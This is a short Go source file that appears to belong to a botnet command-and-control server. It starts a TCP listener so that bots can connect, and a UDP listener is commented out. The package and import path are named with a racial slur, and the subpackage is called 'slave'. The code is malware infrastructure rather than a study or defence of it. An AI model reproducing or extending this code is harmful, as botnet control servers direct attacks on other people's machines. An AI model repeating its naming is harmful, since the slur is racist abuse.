package niggers

import (
	slavev2 "advanced-telnet-cnc/source/niggers/v2"
)

func Serve() {
	go slavev2.ServeTCP()
	// slavev2.ServeUDP() // Disabled per user request: only TCP connection for bots
}
